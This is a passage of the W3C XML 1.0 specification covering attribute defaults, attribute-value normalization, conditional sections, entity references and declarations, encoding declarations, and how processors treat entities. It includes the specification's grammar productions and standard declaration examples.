|  |  |  |  | [[VC: No Notation on Empty Element]](#NoNotationEmpty) |
|  |  |  |  | [[VC: No Duplicate Tokens]](#NoDuplicateTokens) |
| [59] | `Enumeration` | ::= | `'(' [S](#NT-S)? [Nmtoken](#NT-Nmtoken) ([S](#NT-S)? '|' [S](#NT-S)? [Nmtoken](#NT-Nmtoken))* [S](#NT-S)? ')'` | [[VC: Enumeration]](#enum) |
| --- | --- | --- | --- | --- |
|  |  |  |  | [[VC: No Duplicate Tokens]](#NoDuplicateTokens) |

A **NOTATION** attribute identifies a [notation](#dt-notation "Notation"),
declared in the DTD with associated system and/or public identifiers, to be
used in interpreting the element to which the attribute is attached.

**Validity constraint: Notation Attributes**

Values of this type
*MUST* match one of the [notation](#Notations) names
included in the declaration; all notation names in the declaration *MUST* be
declared.

**Validity constraint: One Notation Per Element Type**

An element type *MUST NOT* have more than one **NOTATION**
attribute specified.

**Validity constraint: No Notation on Empty Element**

[For compatibility](#dt-compat "For Compatibility"),
an attribute of type **NOTATION**
*MUST NOT* be declared on an element
declared **EMPTY**.

**Validity constraint: No Duplicate Tokens**

The notation names in a single [NotationType](#NT-NotationType)
attribute declaration, as well as the [NmToken](#NT-Nmtoken)s in a single
[Enumeration](#NT-Enumeration) attribute declaration, *MUST* all be distinct.

**Validity constraint: Enumeration**

Values of this type *MUST* match
one of the [Nmtoken](#NT-Nmtoken) tokens in the declaration.

[For interoperability,](#dt-interop "For interoperability") the same [Nmtoken](#NT-Nmtoken)
*SHOULD NOT* occur more than once in the enumerated
attribute types of a single element type.

#### 3.3.2 Attribute Defaults

An [attribute declaration](#dt-attdecl "Attribute-List Declaration") provides information
on whether the attribute's presence is *REQUIRED*, and if not, how an XML processor
is to react if a declared attribute is absent in a document.

##### Attribute Defaults

| [60] | `DefaultDecl` | ::= | `'#REQUIRED' | '#IMPLIED'` |
| --- | --- | --- | --- |
|  |  |  | `| (('#FIXED' [S](#NT-S))? [AttValue](#NT-AttValue))` | [[VC: Required Attribute]](#RequiredAttr) |
|  |  |  |  | [[VC: Attribute Default Value Syntactically Correct]](#defattrvalid) |
|  |  |  |  | [[WFC: No < in Attribute Values]](#CleanAttrVals) |
|  |  |  |  | [[VC: Fixed Attribute Default]](#FixedAttr) |
|  |  |  |  | [[WFC: No External Entity References]](#NoExternalRefs) |

In an attribute declaration, **#REQUIRED** means that the attribute
*MUST* always be provided, **#IMPLIED** that no default value is provided.
[Definition: If
the declaration is neither **#REQUIRED** nor **#IMPLIED**, then
the [AttValue](#NT-AttValue) value contains the declared **default**
value; the **#FIXED** keyword states that the attribute *MUST* always have
the default value.
When an XML processor encounters
an element
without a specification for an attribute for which it has read a default
value declaration, it *MUST* report the attribute with the declared default
value to the application.]

**Validity constraint: Required Attribute**

If the default
declaration is the keyword **#REQUIRED**, then the attribute *MUST* be
specified for all elements of the type in the attribute-list declaration.

**Validity constraint: Attribute Default Value Syntactically Correct**

The declared default value *MUST* meet the syntactic
constraints of the declared attribute type. That is, the default value of an attribute:

* of type IDREF or ENTITY must match the [Name](#NT-Name) production;
* of type IDREFS or ENTITIES must match the [Names](#NT-Names) production;
* of type NMTOKEN must match the [Nmtoken](#NT-Nmtoken) production;
* of type NMTOKENS must match the [Nmtokens](#NT-Nmtokens) production;
* of an [enumerated type](#NT-EnumeratedType) (either a [NOTATION](#NT-NotationType) type or an [enumeration](#NT-Enumeration)) must match one of the enumerated values.

Note that only the
syntactic constraints of the type are required here; other constraints (e.g.
that the value be the name of a declared unparsed entity, for an attribute of
type ENTITY) will be reported by a validating
parser only if an element without a specification for this attribute
actually occurs.

**Validity constraint: Fixed Attribute Default**

If an attribute
has a default value declared with the **#FIXED** keyword, instances of
that attribute *MUST* match the default value.

Examples of attribute-list declarations:

```
<!ATTLIST termdef
          id      ID      #REQUIRED
          name    CDATA   #IMPLIED>
<!ATTLIST list
          type    (bullets|ordered|glossary)  "ordered">
<!ATTLIST form
          method  CDATA   #FIXED "POST">
```
#### 3.3.3 Attribute-Value Normalization

Before the value of an attribute is passed to the application or checked
for validity, the XML processor *MUST* normalize the attribute value by applying
the algorithm below, or by using some other method such that the value passed
to the application is the same as that produced by the algorithm.

1. All line breaks *MUST* have been normalized on input to #xA as described
   in [**2.11 End-of-Line Handling**](#sec-line-ends), so the rest of this algorithm operates
   on text normalized in this way.
2. Begin with a normalized value consisting of the empty string.
3. For each character, entity reference, or character reference in the
   unnormalized attribute value, beginning with the first and continuing to the
   last, do the following:

   * For a character reference, append the referenced character to the
     normalized value.
   * For an entity reference, recursively apply step 3 of this algorithm
     to the replacement text of the entity.
   * For a white space character (#x20, #xD, #xA, #x9), append a space
     character (#x20) to the normalized value.
   * For another character, append the character to the normalized value.

If the attribute type is not CDATA, then the XML processor *MUST* further
process the normalized attribute value by discarding any leading and trailing
space (#x20) characters, and by replacing sequences of space (#x20) characters
by a single space (#x20) character.

Note that if the unnormalized attribute value contains a character reference
to a white space character other than space (#x20), the normalized value contains
the referenced character itself (#xD, #xA or #x9). This contrasts with the
case where the unnormalized value contains a white space character (not a
reference), which is replaced with a space character (#x20) in the normalized
value and also contrasts with the case where the unnormalized value contains
an entity reference whose replacement text contains a white space character;
being recursively processed, the white space character is replaced with a
space character (#x20) in the normalized value.

All attributes for which no declaration has been read *SHOULD* be treated
by a non-validating processor as if declared **CDATA**.

It is an error if an [attribute
value](#dt-attrval "Attribute Value") contains a [reference](#dt-entref "Entity Reference") to an
entity for which no declaration has been read.

Following are examples of attribute normalization. Given the following
declarations:

```
<!ENTITY d "&#xD;">
<!ENTITY a "&#xA;">
<!ENTITY da "&#xD;&#xA;">
```

the attribute specifications in the left column below would be normalized
to the character sequences of the middle column if the attribute `a`
is declared **NMTOKENS** and to those of the right columns if `a`
is declared **CDATA**.

| Attribute specification | a is NMTOKENS | a is CDATA |
| --- | --- | --- |
| ``` a="  xyz" ``` | ``` x y z ``` | ``` #x20 #x20 x y z ``` |
| ``` a="&d;&d;A&a;&#x20;&a;B&da;" ``` | ``` A #x20 B ``` | ``` #x20 #x20 A #x20 #x20 #x20 B #x20 #x20 ``` |
| ``` a= "&#xd;&#xd;A&#xa;&#xa;B&#xd;&#xa;" ``` | ``` #xD #xD A #xA #xA B #xD #xA ``` | ``` #xD #xD A #xA #xA B #xD #xA ``` |

Note that the last example is invalid (but well-formed) if `a`
is declared to be of type **NMTOKENS**.

### 3.4 Conditional Sections

[Definition:
**Conditional
sections** are portions of the [document type
declaration external subset](#dt-doctype "Document Type Declaration") or
of external parameter entities which are included in, or excluded from,
the logical structure of the DTD based on the keyword which governs them.]

##### Conditional Section

| [61] | `conditionalSect` | ::= | `[includeSect](#NT-includeSect) | [ignoreSect](#NT-ignoreSect)` |
| --- | --- | --- | --- |
| [62] | `includeSect` | ::= | `'<![' [S](#NT-S)? 'INCLUDE' [S](#NT-S)? '[' [extSubsetDecl](#NT-extSubsetDecl) ']]>'` | [[VC: Proper Conditional Section/PE Nesting]](#condsec-nesting) |
| [63] | `ignoreSect` | ::= | `'<![' [S](#NT-S)? 'IGNORE' [S](#NT-S)? '[' [ignoreSectContents](#NT-ignoreSectContents)* ']]>'` | [[VC: Proper Conditional Section/PE Nesting]](#condsec-nesting) |
| [64] | `ignoreSectContents` | ::= | `[Ignore](#NT-Ignore) ('<![' [ignoreSectContents](#NT-ignoreSectContents) ']]>' [Ignore](#NT-Ignore))*` |
| [65] | `Ignore` | ::= | `[Char](#NT-Char)* - ([Char](#NT-Char)* ('<![' | ']]>') [Char](#NT-Char)*)` |

**Validity constraint: Proper Conditional Section/PE Nesting**

If any of the "`<![`",
"`[`", or "`]]>`" of a conditional section is contained
in the replacement text for a parameter-entity reference, all of them *MUST*
be contained in the same replacement text.

Like the internal and external DTD subsets, a conditional section may contain
one or more complete declarations, comments, processing instructions, or nested
conditional sections, intermingled with white space.

If the keyword of the conditional section is **INCLUDE**, then the
contents of the conditional section *MUST* be processed as part of the DTD. If the keyword of
the conditional section is **IGNORE**, then the contents of the conditional
section *MUST* *NOT* be processed as part of the DTD.
If a conditional section with a keyword of **INCLUDE** occurs within
a larger conditional section with a keyword of **IGNORE**, both the outer
and the inner conditional sections *MUST* be ignored. The contents
of an ignored conditional section *MUST* be parsed by ignoring all characters after
the "`[`" following the keyword, except conditional section starts
"`<![`" and ends "`]]>`", until the matching conditional
section end is found. Parameter entity references *MUST NOT* be recognized in this
process.

If the keyword of the conditional section is a parameter-entity reference,
the parameter entity *MUST* be replaced by its content before the processor
decides whether to include or ignore the conditional section.

An example:

```
<!ENTITY % draft 'INCLUDE' >
<!ENTITY % final 'IGNORE' >

<![%draft;[
<!ELEMENT book (comments*, title, body, supplements?)>
]]>
<![%final;[
<!ELEMENT book (title, body, supplements?)>
]]>
```
## 4 Physical Structures

[Definition: An XML document may consist of one
or many storage units. These
are called **entities**; they all have **content** and are
all (except for the [document entity](#dt-docent "Document Entity") and
the [external DTD subset](#dt-doctype "Document Type Declaration")) identified by
entity **name**.] Each XML document has one entity
called the [document entity](#dt-docent "Document Entity"), which serves
as the starting point for the [XML processor](#dt-xml-proc "XML Processor")
and may contain the whole document.

Entities may be either parsed or unparsed. [Definition: The contents of a **parsed
entity** are referred to as its [replacement
text](#dt-repltext "Replacement Text"); this [text](#dt-text "Text") is considered an
integral part of the document.]

[Definition: An **unparsed entity**
is a resource whose contents may or may not be [text](#dt-text "Text"),
and if text, may
be other than XML. Each unparsed entity has an associated [notation](#dt-notation "Notation"), identified by name. Beyond a requirement
that an XML processor make the identifiers for the entity and notation available
to the application, XML places no constraints on the contents of unparsed
entities.]

Parsed entities are invoked by name using entity references; unparsed entities
by name, given in the value of **ENTITY** or **ENTITIES** attributes.

[Definition:
**General entities**
are entities for use within the document content. In this specification, general
entities are sometimes referred to with the unqualified term *entity*
when this leads to no ambiguity.]
[Definition:
**Parameter
entities** are parsed entities for use within the DTD.]
These two types of entities use different forms of reference and are recognized
in different contexts. Furthermore, they occupy different namespaces; a parameter
entity and a general entity with the same name are two distinct entities.

### 4.1 Character and Entity References

[Definition: A **character
reference** refers to a specific character in the ISO/IEC 10646 character
set, for example one not directly accessible from available input devices.]

##### Character Reference

| [66] | `CharRef` | ::= | `'&#' [0-9]+ ';'` |
| --- | --- | --- | --- |
|  |  |  | `| '&#x' [0-9a-fA-F]+ ';'` | [[WFC: Legal Character]](#wf-Legalchar) |

**Well-formedness constraint: Legal Character**

Characters referred
to using character references *MUST* match the production for [Char](#NT-Char).

If the character reference begins with "
`&#x`
",
the digits and letters up to the terminating `;` provide a hexadecimal
representation of the character's code point in ISO/IEC 10646. If it begins
just with "
`&#`
", the digits up to the terminating `;`
provide a decimal representation of the character's code point.

[Definition: An **entity reference**
refers to the content of a named entity.]
[Definition: References to parsed general entities use
ampersand (`&`) and semicolon (`;`) as delimiters.]
[Definition:
**Parameter-entity references**
use percent-sign (`%`) and semicolon (`;`) as delimiters.]

##### Entity Reference

| [67] | `Reference` | ::= | `[EntityRef](#NT-EntityRef) | [CharRef](#NT-CharRef)` |
| --- | --- | --- | --- |
| [68] | `EntityRef` | ::= | `'&' [Name](#NT-Name) ';'` | [[WFC: Entity Declared]](#wf-entdeclared) |
| --- | --- | --- | --- | --- |
|  |  |  |  | [[VC: Entity Declared]](#vc-entdeclared) |
|  |  |  |  | [[WFC: Parsed Entity]](#textent) |
|  |  |  |  | [[WFC: No Recursion]](#norecursion) |
| [69] | `PEReference` | ::= | `'%' [Name](#NT-Name) ';'` | [[VC: Entity Declared]](#vc-entdeclared) |
| --- | --- | --- | --- | --- |
|  |  |  |  | [[WFC: No Recursion]](#norecursion) |
|  |  |  |  | [[WFC: In DTD]](#indtd) |

**Well-formedness constraint: Entity Declared**

In a document
without any DTD, a document with only an internal DTD subset which contains
no parameter entity references, or a document with "
`standalone='yes'`
", for
an entity reference that does not occur within the external subset or a parameter
entity, the [Name](#NT-Name) given in the entity reference *MUST*
[match](#dt-match "match") that in an [entity
declaration](#sec-entity-decl) that does not occur within the external subset or a
parameter entity, except that well-formed documents need not declare
any of the following entities: `amp`,
`lt`,
`gt`,
`apos`,
`quot`. The
declaration of a general entity *MUST* precede any reference to it which appears
in a default value in an attribute-list declaration.

Note that non-validating processors are [not
obligated to](#include-if-valid) read and process entity declarations occurring in parameter entities or in
the external subset; for such documents,
the rule that an entity must be declared is a well-formedness constraint only
if [standalone='yes'](#sec-rmd).

**Validity constraint: Entity Declared**

In a document with an external subset or parameter entity references,
if the document is not standalone (either "`standalone='no'`"
is specified or there is no standalone declaration), then
the [Name](#NT-Name) given in the entity reference *MUST*
[match](#dt-match "match") that in an [entity
declaration](#sec-entity-decl). For interoperability, valid documents *SHOULD* declare
the entities `amp`,
`lt`,
`gt`,
`apos`,
`quot`, in the form specified in [**4.6 Predefined Entities**](#sec-predefined-ent).
The declaration of a parameter entity *MUST* precede any reference to it. Similarly,
the declaration of a general entity *MUST* precede any attribute-list
declaration containing a default value with a direct or indirect reference
to that general entity.

**Well-formedness constraint: Parsed Entity**

An entity reference *MUST
NOT* contain the name of an [unparsed entity](#dt-unparsed "Unparsed Entity").
Unparsed entities may be referred to only in [attribute
values](#dt-attrval "Attribute Value") declared to be of type **ENTITY** or **ENTITIES**.

**Well-formedness constraint: No Recursion**

A parsed entity *MUST NOT* contain a recursive reference to itself, either directly or indirectly.

**Well-formedness constraint: In DTD**

Parameter-entity references *MUST NOT* appear outside
the [DTD](#dt-doctype "Document Type Declaration").

Examples of character and entity references:

```
Type <key>less-than</key> (&#x3C;) to save options.
This document was prepared on &docdate; and
is classified &security-level;.
```

Example of a parameter-entity reference:

```
<!-- declare the parameter entity "ISOLat2"... -->
<!ENTITY % ISOLat2
         SYSTEM "http://www.xml.com/iso/isolat2-xml.entities" >
<!-- ... now reference it. -->
%ISOLat2;
```
### 4.2 Entity Declarations

[Definition: Entities are declared
thus:]

##### Entity Declaration

| [70] | `EntityDecl` | ::= | `[GEDecl](#NT-GEDecl) | [PEDecl](#NT-PEDecl)` |
| --- | --- | --- | --- |
| [71] | `GEDecl` | ::= | `'<!ENTITY' [S](#NT-S) [Name](#NT-Name) [S](#NT-S) [EntityDef](#NT-EntityDef) [S](#NT-S)? '>'` |
| [72] | `PEDecl` | ::= | `'<!ENTITY' [S](#NT-S) '%' [S](#NT-S) [Name](#NT-Name) [S](#NT-S) [PEDef](#NT-PEDef) [S](#NT-S)? '>'` |
| [73] | `EntityDef` | ::= | `[EntityValue](#NT-EntityValue) | ([ExternalID](#NT-ExternalID) [NDataDecl](#NT-NDataDecl)?)` |
| [74] | `PEDef` | ::= | `[EntityValue](#NT-EntityValue) | [ExternalID](#NT-ExternalID)` |

The [Name](#NT-Name) identifies the entity in an [entity
reference](#dt-entref "Entity Reference") or, in the case of an unparsed entity, in the value of
an **ENTITY** or **ENTITIES** attribute. If the same entity is declared
more than once, the first declaration encountered is binding; at user option,
an XML processor *MAY* issue a warning if entities are declared multiple times.

#### 4.2.1 Internal Entities

[Definition: If the
entity definition is an [EntityValue](#NT-EntityValue), the defined
entity is called an **internal entity**. There is no separate physical
storage object, and the content of the entity is given in the declaration.]
Note that some processing of entity and character references in the [literal entity value](#dt-litentval "Literal Entity Value") may be required to produce
the correct [replacement text](#dt-repltext "Replacement Text"): see [**4.5 Construction of Entity Replacement Text**](#intern-replacement).

An internal entity is a [parsed entity](#dt-parsedent "Text Entity").

Example of an internal entity declaration:

```
<!ENTITY Pub-Status "This is a pre-release of the
 specification.">
```
#### 4.2.2 External Entities

[Definition: If the entity is not internal,
it is an **external entity**, declared as follows:]

##### External Entity Declaration

| [75] | `ExternalID` | ::= | `'SYSTEM' [S](#NT-S) [SystemLiteral](#NT-SystemLiteral)` |
| --- | --- | --- | --- |
|  |  |  | `| 'PUBLIC' [S](#NT-S) [PubidLiteral](#NT-PubidLiteral) [S](#NT-S) [SystemLiteral](#NT-SystemLiteral)` |
| [76] | `NDataDecl` | ::= | `[S](#NT-S) 'NDATA' [S](#NT-S) [Name](#NT-Name)` | [[VC: Notation Declared]](#not-declared) |
| --- | --- | --- | --- | --- |

If the [NDataDecl](#NT-NDataDecl) is present, this is a general [unparsed entity](#dt-unparsed "Unparsed Entity"); otherwise it is a parsed entity.

**Validity constraint: Notation Declared**

The [Name](#NT-Name)
*MUST* match the declared name of a [notation](#dt-notation "Notation").

[Definition: The [SystemLiteral](#NT-SystemLiteral) is called the entity's **system
identifier**. It is meant to be converted to a URI reference
(as defined in [[IETF RFC 3986]](#rfc3986)),
as part of the
process of dereferencing it to obtain input for the XML processor to construct the
entity's replacement text.] It is an error for a fragment identifier
(beginning with a `#` character) to be part of a system identifier.
Unless otherwise provided by information outside the scope of this specification
(e.g. a special XML element type defined by a particular DTD, or a processing
instruction defined by a particular application specification), relative URIs
are relative to the location of the resource within which the entity declaration
occurs. This is defined to
be the external entity containing the '<' which starts the declaration, at the
point when it is parsed as a declaration.
A URI might thus be relative to the [document
entity](#dt-docent "Document Entity"), to the entity containing the [external
DTD subset](#dt-doctype "Document Type Declaration"), or to some other [external parameter
entity](#dt-extent "External Entity"). Attempts to
retrieve the resource identified by a URI may be redirected at the parser
level (for example, in an entity resolver) or below (at the protocol level,
for example, via an HTTP `Location:` header). In the absence of additional
information outside the scope of this specification within the resource,
the base URI of a resource is always the URI of the actual resource returned.
In other words, it is the URI of the resource retrieved after all redirection
has occurred.

System
identifiers (and other XML strings meant to be used as URI references) may contain
characters that, according to [[IETF RFC 3986]](#rfc3986),
must be escaped before a URI can be used to retrieve the referenced resource. The
characters to be escaped are the control characters #x0 to #x1F and #x7F (most of
which cannot appear in XML), space #x20, the delimiters '<' #x3C, '>' #x3E and
'"' #x22, the *unwise* characters '{' #x7B, '}' #x7D, '|' #x7C, '\' #x5C, '^' #x5E and
'`' #x60, as well as all characters above #x7F. Since escaping is not always a fully
reversible process, it *MUST* be performed only when absolutely necessary and as late
as possible in a processing chain. In particular, neither the process of converting
a relative URI to an absolute one nor the process of passing a URI reference to a
process or software component responsible for dereferencing it *SHOULD* trigger escaping.
When escaping does occur, it *MUST* be performed as follows:

1. Each character to be escaped is represented in UTF-8 [[Unicode]](#Unicode)
   as one or more bytes.
2. The resulting bytes are escaped with
   the URI escaping mechanism (that is, converted to `%`
   HH,
   where HH is the hexadecimal notation of the byte value).
3. The original character is replaced by the resulting character sequence.

**Note:**

In a future edition of this specification, the XML Core Working Group intends to replace the preceding paragraph
and list of steps with a normative reference to an upcoming revision of IETF RFC 3987, which will define
"Legacy Extended IRIs (LEIRIs)". When this revision is available, it is the intent of the XML Core WG to use it to replace
language similar to the above in any future revisions of XML-related specifications under its purview.

[Definition: In addition to a system
identifier, an external identifier may include a **public identifier**.]
An XML processor attempting to retrieve the entity's content may use
any combination of
the public and system identifiers as well as additional information outside the
scope of this specification to try to generate an alternative URI reference.
If the processor is unable to do so, it *MUST* use the URI
reference specified in the system literal. Before a match is attempted,
all strings of white space in the public identifier *MUST* be normalized to
single space characters (#x20), and leading and trailing white space *MUST*
be removed.

Examples of external entity declarations:

```
<!ENTITY open-hatch
         SYSTEM "http://www.textuality.com/boilerplate/OpenHatch.xml">
<!ENTITY open-hatch
         PUBLIC "-//Textuality//TEXT Standard open-hatch boilerplate//EN"
         "http://www.textuality.com/boilerplate/OpenHatch.xml">
<!ENTITY hatch-pic
         SYSTEM "../grafix/OpenHatch.gif"
         NDATA gif >
```
### 4.3 Parsed Entities

#### 4.3.1 The Text Declaration

External parsed entities *SHOULD* each begin with a **text declaration**.

##### Text Declaration

| [77] | `TextDecl` | ::= | `'<?xml' [VersionInfo](#NT-VersionInfo)? [EncodingDecl](#NT-EncodingDecl) [S](#NT-S)? '?>'` |
| --- | --- | --- | --- |

The text declaration *MUST* be provided literally, not by reference
to a parsed entity. The text declaration
*MUST NOT* appear at any
position other than the beginning of an external parsed entity. The text declaration
in an external parsed entity is not considered part of its [replacement text](#dt-repltext "Replacement Text").

#### 4.3.2 Well-Formed Parsed Entities

The document entity is well-formed if it matches the production labeled [document](#NT-document). An external general parsed entity is well-formed
if it matches the production labeled [extParsedEnt](#NT-extParsedEnt). All
external parameter entities are well-formed by definition.

**Note:**

Only parsed entities that are referenced directly or indirectly within the document are required to be well-formed.

##### Well-Formed External Parsed Entity

| [78] | `extParsedEnt` | ::= | `[TextDecl](#NT-TextDecl)? [content](#NT-content)` |
| --- | --- | --- | --- |

An internal general parsed entity is well-formed if its replacement text
matches the production labeled [content](#NT-content). All internal
parameter entities are well-formed by definition.

A consequence of well-formedness in general
entities is that the logical and physical
structures in an XML document are properly nested; no [start-tag](#dt-stag "Start-Tag"), [end-tag](#dt-etag "End Tag"), [empty-element tag](#dt-empty "Empty"), [element](#dt-element "Element"), [comment](#dt-comment "Comment"), [processing instruction](#dt-pi "Processing instruction"), [character
reference](#dt-charref "Character Reference"), or [entity reference](#dt-entref "Entity Reference")
can begin in one entity and end in another.

#### 4.3.3 Character Encoding in Entities

Each external parsed entity in an XML document may use a different encoding
for its characters. All XML processors *MUST* be able to read entities in both
the UTF-8 and UTF-16 encodings. The terms "UTF-8"
and "UTF-16" in this specification do not apply to
related character encodings, including but not limited to UTF-16BE, UTF-16LE, or CESU-8.

Entities encoded in UTF-16 *MUST* and entities
encoded in UTF-8 *MAY* begin with the Byte Order Mark described by
Annex H of [[ISO/IEC 10646:2000]](#ISO10646-2000), section
16.8 of [[Unicode]](#Unicode)
(the ZERO WIDTH NO-BREAK SPACE character, #xFEFF). This is an encoding signature,
not part of either the markup or the character data of the XML document. XML
processors *MUST* be able to use this character to differentiate between UTF-8
and UTF-16 encoded documents.

If the replacement text of an external entity is to
begin with the character U+FEFF, and no text declaration
is present, then a Byte Order Mark MUST be present,
whether the entity is encoded in UTF-8 or UTF-16.

Although an XML processor is required to read only entities in the UTF-8
and UTF-16 encodings, it is recognized that other encodings are used around
the world, and it may be desired for XML processors to read entities that
use them. In
the absence of external character encoding information (such as MIME headers),
parsed entities which are stored in an encoding other than UTF-8 or UTF-16
*MUST* begin with a text declaration (see [**4.3.1 The Text Declaration**](#sec-TextDecl)) containing
an encoding declaration:

##### Encoding Declaration

| [80] | `EncodingDecl` | ::= | `[S](#NT-S) 'encoding' [Eq](#NT-Eq) ('"' [EncName](#NT-EncName) '"' | "'" [EncName](#NT-EncName) "'" )` |
| --- | --- | --- | --- |
| [81] | `EncName` | ::= | `[A-Za-z] ([A-Za-z0-9._] | '-')*` | */\* Encoding name contains only Latin characters \*/* |
| --- | --- | --- | --- | --- |

In the [document entity](#dt-docent "Document Entity"), the encoding
declaration is part of the [XML declaration](#dt-xmldecl "XML Declaration").
The [EncName](#NT-EncName) is the name of the encoding used.

In an encoding declaration, the values "
`UTF-8`
", "
`UTF-16`
",
"
`ISO-10646-UCS-2`
", and "
`ISO-10646-UCS-4`
"
*SHOULD* be used
for the various encodings and transformations of Unicode / ISO/IEC 10646,
the values "
`ISO-8859-1`
", "
`ISO-8859-2`
",
... "
`ISO-8859-`
n
" (where n
is the part number) *SHOULD* be used for the parts of ISO 8859, and
the values "
`ISO-2022-JP`
", "
`Shift_JIS`
",
and "
`EUC-JP`
"
*SHOULD* be used for the various encoded
forms of JIS X-0208-1997. It
is *RECOMMENDED* that character encodings registered (as *charset*s)
with the Internet Assigned Numbers Authority [[IANA-CHARSETS]](#IANA),
other than those just listed, be referred to using their registered names;
other encodings *SHOULD* use names starting with an "x-" prefix.
XML processors *SHOULD* match character encoding names in a case-insensitive
way and *SHOULD* either interpret an IANA-registered name as the encoding registered
at IANA for that name or treat it as unknown (processors are, of course, not
required to support all IANA-registered encodings).

In the absence of information provided by an external transport protocol
(e.g. HTTP or MIME), it is a [fatal error](#dt-fatal "Fatal Error") for
an entity including an encoding declaration to be presented to the XML processor
in an encoding other than that named in the declaration, or for an entity which
begins with neither a Byte Order Mark
nor an encoding declaration to use an encoding other than UTF-8. Note that
since ASCII is a subset of UTF-8, ordinary ASCII entities do not strictly
need an encoding declaration.

It is a [fatal error](#dt-fatal "Fatal Error") for a [TextDecl](#NT-TextDecl) to occur other
than at the beginning of an external entity.

It is a [fatal error](#dt-fatal "Fatal Error") when an XML processor
encounters an entity with an encoding that it is unable to process. It
is a [fatal error](#dt-fatal "Fatal Error") if an XML entity is determined (via default, encoding declaration,
or higher-level protocol) to be in a certain encoding but contains byte
sequences that are not legal in that encoding. Specifically, it is a
fatal error if an entity encoded in UTF-8 contains any ill-formed code unit sequences,
as defined in section 3.9 of  Unicode [[Unicode]](#Unicode). Unless an encoding
is determined by a higher-level protocol, it is also a [fatal error](#dt-fatal "Fatal Error") if an XML entity
contains no encoding declaration and its content is not legal UTF-8 or UTF-16.

Examples of text declarations containing encoding declarations:

```
<?xml encoding='UTF-8'?>
<?xml encoding='EUC-JP'?>
```
### 4.4 XML Processor Treatment of Entities and References

The table below summarizes the contexts in which character references,
entity references, and invocations of unparsed entities might appear and the
*REQUIRED* behavior of an [XML processor](#dt-xml-proc "XML Processor")
in each case. The labels in the leftmost column describe the recognition context:

Reference in Content

as a reference anywhere after the [start-tag](#dt-stag "Start-Tag")
and before the [end-tag](#dt-etag "End Tag") of an element; corresponds
to the nonterminal [content](#NT-content).

Reference in Attribute Value

as a reference within either the value of an attribute in a [start-tag](#dt-stag "Start-Tag"),
or a default value in an [attribute declaration](#dt-attdecl "Attribute-List Declaration");
corresponds to the nonterminal [AttValue](#NT-AttValue).

Occurs as Attribute Value

as a [Name](#NT-Name), not a reference, appearing either as
the value of an attribute which has been declared as type **ENTITY**,
or as one of the space-separated tokens in the value of an attribute which
has been declared as type **ENTITIES**.

Reference in Entity Value

as a reference within a parameter or internal entity's [literal
entity value](#dt-litentval "Literal Entity Value") in the entity's declaration; corresponds to the nonterminal [EntityValue](#NT-EntityValue).

Reference in DTD

as a reference within either the internal or external subsets of the [DTD](#dt-doctype "Document Type Declaration"), but outside of an [EntityValue](#NT-EntityValue), [AttValue](#NT-AttValue), [PI](#NT-PI), [Comment](#NT-Comment), [SystemLiteral](#NT-SystemLiteral), [PubidLiteral](#NT-PubidLiteral),
or the contents of an ignored conditional section (see [**3.4 Conditional Sections**](#sec-condition-sect)).

.

|  | Entity Type | | | | Character |
| --- | --- | --- | --- | --- | --- |
| Parameter | Internal General | External Parsed General | Unparsed |
| Reference in Content | [Not recognized](#not-recognized) | [Included](#included) | [Included if validating](#include-if-valid) | [Forbidden](#forbidden) | [Included](#included) |
| Reference in Attribute Value | [Not recognized](#not-recognized) | [Included in literal](#inliteral) | [Forbidden](#forbidden) | [Forbidden](#forbidden) | [Included](#included) |
| Occurs as Attribute Value | [Not recognized](#not-recognized) | [Forbidden](#forbidden) | [Forbidden](#forbidden) | [Notify](#notify) | [Not recognized](#not-recognized) |
| Reference in EntityValue | [Included in literal](#inliteral) | [Bypassed](#bypass) | [Bypassed](#bypass) | [Error](#error) | [Included](#included) |
| Reference in DTD | [Included as PE](#as-PE) | [Forbidden](#forbidden) | [Forbidden](#forbidden) | [Forbidden](#forbidden) | [Forbidden](#forbidden) |

#### 4.4.1 Not Recognized

Outside the DTD, the `%` character has no special significance;
thus, what would be parameter entity references in the DTD are not recognized
as markup in [content](#NT-content). Similarly, the names of unparsed
entities are not recognized except when they appear in the value of an appropriately
declared attribute.

#### 4.4.2 Included

[Definition: An entity is **included**
when its [replacement text](#dt-repltext "Replacement Text") is retrieved
and processed, in place of the reference itself, as though it were part of
the document at the location the reference was recognized.] The replacement
text may contain both [character data](#dt-chardata "Character Data")
and (except for parameter entities) [markup](#dt-markup "Markup"),
which *MUST* be recognized in the usual way. (The string "
`AT&amp;T;`
"
expands to "
`AT&T;`
" and the remaining ampersand
is not recognized as an entity-reference delimiter.) A character reference
is **included** when the indicated character is processed in place
of the reference itself.

#### 4.4.3 Included If Validating

When an XML processor recognizes a reference to a parsed entity, in order
to [validate](#dt-valid "Validity") the document, the processor
*MUST*
[include](#dt-include "Include") its replacement text. If
the entity is external, and the processor is not attempting to validate the
XML document, the processor *MAY*, but need
not, include the entity's replacement text. If a non-validating processor
does not include the replacement text, it *MUST* inform the application that
it recognized, but did not read, the entity.

This rule is based on the recognition that the automatic inclusion provided
by the SGML and XML entity mechanism, primarily designed to support modularity
in authoring, is not necessarily appropriate for other applications, in particular
document browsing. Browsers, for example, when encountering an external parsed
entity reference, might choose to provide a visual indication of the entity's
presence and retrieve it for display only on demand.

#### 4.4.4 Forbidden

The following are forbidden, and constitute [fatal
errors](#dt-fatal "Fatal Error"):

* the appearance of a reference to an [unparsed
  entity](#dt-unparsed "Unparsed Entity"), except in the
  [EntityValue](#NT-EntityValue) in an entity declaration.
* the appearance of any character or general-entity reference in the
  DTD except within an [EntityValue](#NT-EntityValue) or [AttValue](#NT-AttValue).
* a reference to an external entity in an attribute value.
#### 4.4.5 Included in Literal

When an [entity reference](#dt-entref "Entity Reference") appears in
an attribute value, or a parameter entity reference appears in a literal entity
value, its [replacement text](#dt-repltext "Replacement Text")
*MUST* be processed
in place of the reference itself as though it were part of the document at
the location the reference was recognized, except that a single or double
quote character in the replacement text *MUST* always be treated as a normal data
character and *MUST NOT* terminate the literal. For example, this is well-formed:

```
<!ENTITY % YN '"Yes"' >
<!ENTITY WhatHeSaid "He said %YN;" >
```

while this is not:

```
<!ENTITY EndAttr "27'" >
<element attribute='a-&EndAttr;>
```
#### 4.4.6 Notify

When the name of an [unparsed entity](#dt-unparsed "Unparsed Entity")
appears as a token in the value of an attribute of declared type **ENTITY**
or **ENTITIES**, a validating processor *MUST* inform the application of
the [system](#dt-sysid "System Identifier") and [public](#dt-pubid "Public identifier")
(if any) identifiers for both the entity and its associated [notation](#dt-notation "Notation").

#### 4.4.7 Bypassed

When a general entity reference appears in the [EntityValue](#NT-EntityValue)
